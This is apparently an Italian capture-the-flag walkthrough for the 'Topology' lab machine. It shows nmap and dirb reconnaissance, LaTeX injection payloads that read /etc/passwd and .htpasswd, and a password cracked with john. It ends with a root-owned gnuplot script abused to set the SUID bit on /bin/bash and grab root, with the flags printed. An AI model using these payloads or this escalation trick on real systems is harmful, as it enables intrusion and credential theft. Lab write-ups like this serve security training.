@@ -1,0 +1,78 @@
+---------------------------------------------------------------------------------------------------------------
+nmap -A -Pn -n -vvv 10.10.11.217
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65qOGPSRC7ko+vPGrMrUKptY7vMtBZuaDUQTNURCs5lRBkCFZIrXTGf/Xmg9MYZTnwm+0dMjIZTUZnQvbj4kdsmzWUOxg5Leumcy+pR/AhBqLw2wyC4kcX+fr/1mcAgbqZnCczedIcQyjjO9M1BQqUMQ7+rHDpRBxV9+PeI9kmGyF6638DJP7P/R2h1N9MuAlVohfYtgIkEMpvfCUv5g/VIRV4atP9x+11FHKae5/xiK95hsIgKYCQtWXvV7oHLs3rB0M5fayka1vOGgn6/nzQ99pZUMmUxPUrjf4V3Pa1XWkS5TSv2krkLXNnxQHoZOMQNKGmDdk0M8UfuClEYiHt+zDDYWPI672OK/qRNI7azALWU9OfOzhK3WWLKXloUImRiM0lFvp4edffENyiAiu8sWHWTED0tdse2xg8OfZ6jpNVertFTTbnilwrh2P5oWq+iVWGL8yTFeXvaSK5fq9g9ohD8FerF2DjRbj0lVonsbtKS1F0uaDp/IEaedjAeE=
+|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIR4Yogc3XXHR1rv03CD80VeuNTF/y2dQcRyZCo4Z3spJ0i+YJVQe/3nTxekStsHk8J8R28Y4CDP7h0h9vnlLWo=
+|   256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaM68hPSVQXNWZbTV88LsN41odqyoxxgwKEb1SOPm5k
+80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Miskatonic University | Topology Group
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---------------------------------------------------------------------------------------------------------------
+Creiamo il record nel file degli host name 
+sudo vi /etc/hosts
+[ip]	[host]
+sudo echo "10.10.11.217  name.host" >> /etc/hosts
+
+---------------------------------------------------------------------------------------------------------------
+Effettuiamo una scansione con dirb 
+dirb http://10.10.11.217 -w /usr/share/wordlists/dirb/common.txt
+
+---------------------------------------------------------------------------------------------------------------
+Visitiamo la pagina http://topology.htb
+Nel codice sorgente troviamo la seguente pagina -> http://latex.topology.htb/equation.php -> Aggiungiamolo al file hosts
+
+Si apre una pagina dove si possono eseguire comandi in latex. Facciamo subito delle ricerche per vedere se questo input è attaccabile.
+Troviamo un po' di payload -> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection
+	\verbatiminput{/etc/passwd} -> Questo comando mostra un errore
+	\immediate\write18{id > output} -> Questo comando invece visualizza l'immagine di comando errato
+	
+	\newread\file \openin\file=/etc/passwd \read\file to\line \text{\line} \closein\fileu
+	$\lstinputlisting{/etc/passwd}$ -> Vediamo il file!
+	$\lstinputlisting{/var/www/dev/.htpasswd}$ -> Otteniamo in output un username e password -> vdaisley:XXXX
+	
+Proviamo a decriptarla
+john --wordlist=/home/mrx/aplicaciones/rockyou.txt hash
+RISULTATO -> calculus20       
+
+ssh vdaisley@topology.htb -> Entrati!
+cat user.txt -> e0975b36008d51f0333bc139a8725488
+---------------------------------------------------------------------------------------------------------------
+Verifichiamo che versione di Python è installata nella macchina e passiamo ad una shell con pieni comandi
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# sudo -l => Check if user sau can run any command as root
+# ps aux => Check running process
+# netstat -nat => Check open ports
+
+Cerchiamo se l'utente ha SUID
+find / -perm -u=s -type f 2>/dev/null
+getcap -r / 2>/dev/null
+
+Scarichiamo pspy64, attiviamo il server sulla nostra macchina e scarichiamo nella macchina attaccata
+sudo python -m http.server 80
+wget http://[your_ip]:80/pspy64.sh
+chmod 777 pspy64.sh
+./pspy64.sh > pspy64
+
+Analizziamo pspy64
+
+Troviamo la seguente riga che potrebbe essere interessante -> /bin/sh -c /opt/gnuplot/getdata.sh
+
+Andiamo a scrivere all'interno un comando per dare il controllo della console anche all'utente
+echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/privesc.plt
+cat /opt/gnuplot/privesc.plt
+watch -n 1 ls -l /bin/bash
+ls -l /bin/bash
+bash -p -> BASH OTTENUTA
+whoami
+cat /root/root.txt  -> 1c1aa8458596c18566d58de0cb6c4bbe
